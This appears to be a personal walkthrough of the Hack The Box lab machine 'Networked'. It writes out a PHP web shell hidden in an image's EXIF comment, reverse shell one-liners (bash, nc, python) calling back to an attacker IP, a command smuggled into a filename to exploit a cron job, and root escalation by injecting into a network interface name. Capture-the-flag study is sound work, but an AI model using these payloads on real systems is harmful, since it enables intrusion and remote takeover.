
  
  
  
  

Networked HTB, IP 10.10.10.146

#Initial Enumeration

1. nmap -sC -sV 10.10.10.146


2. Dirb/ Gobuster
dirb http://10.10.10.146
dirb http://10.10.10.146 -X .php


----------------------------------------------------------------------------------------------------------------------------
#Port Enumeration

1.Enumerating port 80



View page source: Control+U



Interesting Files

 http://10.10.10.146/upload.php



Trying to upload a shell we see the error “Invalid image file”

http:10.10.10.146/backup




Download the file backup.tar






Modifying bb.jpeg

exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' bb.jpeg
mv bb.jpeg bb.php.jpeg

We successfully uploaded bb.php.jpeg photo.
view-source:http://10.10.10.146/uploads/10_10_14_21.php.jpeg?cmd=nc -e /bin/bash 10.10.14.21 8888



Try..
A)bash -i >& /dev/tcp/10.10.14.21/1234 0>&1
B) nc -e /bin/sh 10.10.14.21 1234  DONE
C) python -c 'import soc ket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.21",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’


  After enumerating home directory of user guly we see that a php script is running as a cronjob which could be used to gain shell as that user. Lets look at code check_attack.php.  





Notes:
  We see that it scans for files, If the files were found as malicious, then a cron job will check and report to guly with mail($to, $msg, $msg, $headers, "-F$value"); every three minutes, for files in /var/www/html/uploads that doesn’t begin with an IP address. We can touch a file with a file name that begins with ; to separate sendmail from the command that we want to execute.
   
   touch ';nc 10.10.12.161 4321 -c bash'   
   
   
   
   
   user.txt

-------------------------------------------------------------------------------------------------------------------------------------------------------------------
  #Privilege Escalation
  
   sudo -l
   (root) NOPASSWD: /usr/local/sbin/changename.sh


   As guly I checked sudo -l and found that guly can run /usr/local/sbin/changename.sh as root without a password:
   
   
   
  This script simply creates a network script for an interface called guly then activates that interface. It asks the user for these options: NAME, PROXY_METHOD, BROWSER_ONLY, BOOTPROTO. We’re interested in the options because according to this page(https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f) we can inject commands in the interface name. Let’s try to execute bash:
  
   interface NAME:
   gu bash 
  
   or   
   
   
root.txt
